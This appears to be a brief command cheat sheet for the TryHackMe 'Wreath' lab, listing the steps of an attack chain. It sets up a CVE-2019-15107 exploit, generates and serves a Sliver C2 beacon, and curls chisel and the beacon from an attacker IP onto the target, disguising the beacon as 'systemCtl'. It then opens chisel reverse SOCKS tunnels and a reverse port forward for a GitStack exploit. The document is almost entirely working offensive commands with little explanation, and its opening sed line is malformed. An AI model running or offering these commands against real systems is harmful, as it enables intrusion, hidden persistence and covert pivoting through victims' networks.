# Wreath CMD-by-CMDs

```bash
sed -i 's///g' *-CMD-by-CMDs.md
```

```bash
echo "10.200.X.200 thomaswreath.thm thomaswreath.thm.evil.com" | sudo tee -a /etc/hosts

# CVE 
cd CVE-2019-15107 
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
python3 

# Sliver
generate beacon --http 10.50.85.217:2222 --arch amd64 --os linux --save /home/kali/Wreath/
http -L 10.50.85.217 -l 2222


curl http://10.50.85.217/chisel -o chisel
curl http://10.50.85.217/SILVER -o systemCtl


sudo ./chisel server -hosts 10.50.85.217 --reverse -socks 10000
nohup ./chisel client 10.50.85.217:10000 R:10001:socks &
# modify /etc/proxychains4.conf socks5 127.0.0.1 10001

# Reverse Port forward for gitstack exploit
nohup ./chisel client 10.50.85.217:10000 R:127.0.0.1:10002:10.200.84.150:80 &

```


